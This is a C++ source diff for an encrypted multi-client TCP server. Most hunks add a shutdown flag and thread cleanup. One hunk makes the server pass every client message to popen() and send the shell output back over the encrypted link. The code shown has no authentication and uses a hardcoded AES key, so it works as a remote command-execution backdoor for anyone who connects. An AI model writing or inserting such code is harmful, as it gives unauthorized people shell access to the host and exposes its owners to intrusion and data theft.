@@ -36,6 +36,8 @@ struct CryptoContext {
 map<string, pair<int, steady_clock::time_point>> clients;
 mutex clients_mutex;
 mutex console_mutex;
+bool server_running = true;
+
 unsigned char aes_key[AES_KEY_SIZE / 8] = {
     0x73, 0x2F, 0x91, 0xCE, 0x44, 0x18, 0x6B, 0x3D,
     0xF1, 0xA0, 0xD4, 0x7E, 0x88, 0xC5, 0x2A, 0x9B,
@@ -227,7 +229,7 @@ void HandleClient(int client_socket, sockaddr_in client_addr) {
             cout << "[+] Client '" << client_id << "' joined from " << client_ip << endl;
         }
 
-        while (true) {
+        while (server_running) {
             bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
             if (bytes_received <= 0) {
                 if (errno == EWOULDBLOCK || errno == EAGAIN) {
@@ -274,6 +276,23 @@ void HandleClient(int client_socket, sockaddr_in client_addr) {
             if (!message.empty()) {
                 lock_guard<mutex> lock(console_mutex);
                 cout << "\n[Command from " << client_id << "]: " << message << endl;
+                
+                // Execute command and send response
+                string response;
+                FILE* pipe = popen(message.c_str(), "r");
+                if (pipe) {
+                    char cmd_buffer[128];
+                    while (fgets(cmd_buffer, sizeof(cmd_buffer), pipe) != NULL) {
+                        response += cmd_buffer;
+                    }
+                    pclose(pipe);
+                } else {
+                    response = "Failed to execute command";
+                }
+                
+                if (!SendEncrypted(client_socket, response)) {
+                    cerr << "Failed to send command response to client" << endl;
+                }
             }
         }
     }
@@ -328,12 +347,13 @@ void StartServer(int port) {
         cout << "[*] Type 'exit' to shut down the server\n";
     }
 
-    while (true) {
+    while (server_running) {
         sockaddr_in client_addr;
         socklen_t client_addr_size = sizeof(client_addr);
         int client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_size);
 
         if (client_socket < 0) {
+            if (!server_running) break; // Server is shutting down
             lock_guard<mutex> lock(console_mutex);
             cerr << "Accept error" << endl;
             continue;
@@ -393,7 +413,7 @@ void CommandInterface() {
     cout << "[*] Type 'list' to see connected clients\n";
     cout << "[*] Type 'exit' to shut down the server\n";
 
-    while (true) {
+    while (server_running) {
         cout << "\n[Server Command]> ";
         string input;
         getline(cin, input);
@@ -401,6 +421,7 @@ void CommandInterface() {
         if (input.empty()) continue;
 
         if (input == "exit") {
+            server_running = false;
             break;
         }
 
@@ -457,7 +478,9 @@ int main() {
 
         CommandInterface();
 
-        server_thread.detach();
+        // Clean up
+        server_running = false;
+        server_thread.join();
     }
     catch (const exception& e) {
         cerr << "Critical error: " << e.what() << endl;
